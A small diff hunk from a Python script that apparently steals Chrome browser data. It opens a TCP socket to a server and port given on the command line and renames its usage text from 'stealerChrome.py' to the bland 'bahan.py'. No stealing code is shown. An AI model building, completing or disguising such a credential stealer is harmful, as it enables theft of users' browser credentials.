@@ -10,7 +10,7 @@ sys.stdout = original_stdout
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 if len(sys.argv) != 3:
-    print("Penggunaan:  \npython3 stealerChrome.py [server] [port]")
+    print("Penggunaan:  \npython3 bahan.py [server] [port]")
     sys.exit(1)
 else:
     server = sys.argv[1]
